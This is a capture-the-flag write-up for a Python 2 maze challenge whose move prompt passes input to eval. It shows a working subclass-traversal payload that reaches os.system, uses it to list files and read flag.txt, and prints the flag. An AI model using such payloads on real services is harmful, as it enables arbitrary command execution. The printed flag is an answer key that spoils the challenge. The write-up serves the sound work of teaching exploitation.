## No Step On Snek (Pwn, 75pts)

#### Challenge Description

I heard you guys like python pwnables. Author: trashcanna

nc umbccd.io 4000

#### Overview

When connecting to the given credentials, you're presented with a maze.

```
Welcome to the aMAZEing Maze
Your goal is to get from one side of the board to the other.
Your character is represented by "OO" and the finish will be "FF"
W/w - Move up!
A/a - Move left!
S/s - Move down!
D/d - Move right!
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|OO               |           |                 |
+  +--+--+  +--+  +--+--+  +  +  +--+--+--+--+  +
|  |        |  |           |  |  |           |  |
+  +  +--+--+  +--+--+--+  +--+  +  +--+--+  +  +
|  |        |              |     |     |        |
+  +--+--+  +--+--+--+  +--+  +--+--+  +  +--+--+
|        |           |     |        |  |  |     |
+--+--+--+--+--+--+  +--+--+  +--+--+  +  +  +  +
|                 |        |  |        |  |  |  |
+  +--+--+--+--+  +  +--+  +  +  +--+--+--+  +  +
|           |     |  |     |  |              |  |
+--+--+--+  +  +--+--+  +  +  +--+--+--+--+--+  +
|           |     |     |  |  |           |     |
+  +--+--+--+--+  +  +--+--+  +  +  +--+--+  +--+
|        |  |     |     |     |  |  |     |     |
+  +--+  +  +  +--+--+  +  +--+  +--+  +  +--+  +
|  |     |     |        |        |     |        |
+--+  +--+  +--+--+  +--+  +--+--+  +--+--+--+  +
|     |  |        |        |        |        |  |
+  +--+  +--+--+  +--+  +--+  +--+--+--+--+  +  +
|  |  |     |        |  |  |           |     |  |
+  +  +  +  +  +--+  +  +  +--+--+--+  +  +--+  +
|  |     |     |  |  |              |  |  |     |
+  +--+--+--+--+  +  +--+--+--+--+  +  +  +  +--+
|  |           |  |        |  |     |  |     |  |
+  +  +--+--+  +  +--+--+  +  +  +--+  +  +--+  +
|  |  |     |     |     |  |     |     |  |     |
+  +  +  +--+--+--+  +  +  +--+--+  +--+  +  +  +
|  |  |  |        |  |  |     |     |  |     |  |
+  +  +  +  +--+  +  +  +--+  +  +--+  +--+--+  +
|     |        |     |           |            FF|
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+


Make your move:
```



#### Solution

Originally I thought this may be a "game2pwn" challenge where after solving the maze you're presented with the issue. The challenge is a bit more interesting than that though. By providing garbage input to "Make your move", you'll notice you can trigger a python exception.

```
Make your move: A B
Traceback (most recent call last):
  File "/home/challuser/nosteponsnek.py", line 73, in <module>
    __main__()
  File "/home/challuser/nosteponsnek.py", line 69, in __main__
    still_playing = make_move(maze)
  File "/home/challuser/nosteponsnek.py", line 27, in make_move
    move = input("Make your move: ")
  File "<string>", line 1
    A B
      ^
SyntaxError: unexpected EOF while parsing
```

This indicates the issue is a python eval attack. By using the `warning.catch_warnings` class (which happens to be 59, which matches up with some other writeups I found for similar challenges), we can run shell commands. For instance, we can run `ls` to try to determine where the flag is located.

```
Make your move: ().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
flag.txt  nosteponsnek.py
```

Now we can simply exploit the issue again to get the flag (and exfil the script if you wanted to).

```
Make your move: ().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('cat flag.txt')
DawgCTF{bUt_iT'5_c@ll3d_1nput}
```



#### Flag

```
DawgCTF{bUt_iT'5_c@ll3d_1nput}
```

